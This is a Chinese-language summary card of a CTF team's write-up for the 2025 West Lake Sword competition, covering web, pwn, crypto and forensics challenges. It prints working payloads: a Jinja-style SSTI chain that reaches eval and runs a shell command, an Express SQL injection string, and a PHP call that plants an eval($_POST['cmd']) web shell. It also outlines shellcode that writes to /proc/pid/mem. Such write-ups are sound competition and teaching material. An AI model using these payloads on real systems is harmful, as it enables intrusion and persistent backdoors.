---
title: "第八届西湖论剑·中国杭州网络安全技能大赛网络攻防实战赛-初赛 WriteUp by 金石滩小鲨鱼"
category: web
tags: ["西湖论剑", "web", "SSTI", "Express-SQL注入", "PHPRCE写shell", "Vpwn"]
signals: ["西湖论剑 2025", "SSTI", "Express-SQL注入", "PHPRCE写shell", "Vpwn", "PWN-Heaven's door,Crypto-matrixRSA,Disk取证,Crypto-DSA验证,内存取证AESEAX,Web-入异步并发查找", "ssti", "Rank-l", "sqli-or-not", "Rank-U", "Heaven", "door", "matrixRSA", "blink"]
difficulty: medium
source: "https://www.ctfiot.com/225187.html"
tools: ["C", "PHP", "tshark"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 第八届西湖论剑·中国杭州网络安全技能大赛网络攻防实战赛-初赛 WriteUp by 金石滩小鲨鱼

> 赛事：西湖论剑 2025 | 方向：web | 难度：medium | 工具：C、PHP、tshark

## 一句话总结

金石滩小鲨鱼第10名WP,12题(签到/Rank-l/sqli-or-not/Rank-U/Vpwn/Heaven's door/matrixRSA/糟糕的磁盘/blink/sharkp/easydatalog/DSASignatureData/easyrawencode),涵盖SSTI unicode转义+Express JSON注入+async并发查找PHP写shell+矩阵RSA+32/64切换PWN+DSA验证+内存取证AES+RC4签名

## 攻击链

1. SSTI: ?info=触发SSTI `{{x.__init__.__globals__[''__builtins__''][''eval'']("__import__(''os'').popen(''head /flagff149'').read()")}}` 编码unicode转义|Express SQL注入: ?info={"username":"$` or 1=1%23","password":"123"} 注入引号绕/''"''禁用|写shell: GET /admin/Uploads/1f14bba00da3b75118bc8dbf8625f7d0/ 找PHP→<?php file_put_contents("Uploads/127.0.0.1/111.php", "<?php @eval($_POST[''cmd'']);?>")?>|DSA验证: tshark提取→DSS.verify base64签名→altered_data.csv|RSA矩阵: Coppersmith small_roots解p→C^d求M|AES-EAX+RC4签名: volatility envars hackkey+RSA-OAEP解aes_key+RC4解签名|PWN-Vpwn: 32位高低地址分8次edit|Heaven''s door: 32/64位切换+open /proc/pid/mem

## 关键 payload

```
{{x.__init__.__globals__[''__builtins__''][''eval'']("__import__(''os'').popen(''head /flagff149'').read()")}}|?info={"username":"$` or 1=1%23","password":"123"}|tshark -r filter1.pcapng -T fields -e http.request.uri.query.parameter -e json.object|p0<<100+x, f.small_roots(X=2^100, beta=0.4)|AES_EAX.decrypt_and_verify(ciphertext, tag)|edit(18..25) 分写32+32位
```

## 经验教训

1) SSTI黑名单绕:用unicode转义\u0062\u0069(对应b/i)拼builtins; 2) Express SQL注入:JSON.parse+字符串模板replace,username用$`反引号绕过引号过滤; 3) async并发查找PHP文件:aiohttp+aiohttp.TCPConnector(limit=600)并发扫描,目标URL/admin/Uploads/{md5}/ 找PHP; 4) PHP file_put_contents写shell:folder = "Uploads/127.0.0.1/"; content = "<?php phpinfo();@eval($_POST['cmd']); ?>"; 5) tshark提取DSA签名:'-T fields -e http.request.uri.query.parameter -e json.object -E separator=, > extracted_data.txt'; 6) PWN Vpwn 64位地址分32+32位写; 7) Heaven's door:32位shellcode+retfq+CS=0x33+open /proc/pid/mem+lseek SEEK_SET+write

## 标签

SSTI、Express-SQL注入、PHPRCE写shell、Vpwn、PWN-Heaven's door,Crypto-matrixRSA,Disk取证,Crypto-DSA验证,内存取证AESEAX,Web-入异步并发查找

## 参考来源

- https://www.ctfiot.com/225187.html
- 原文件：第八届西湖论剑·中国杭州网络安全技能大赛网络攻防实战赛-初赛_WriteUp_by_金石滩小鲨鱼.full.md
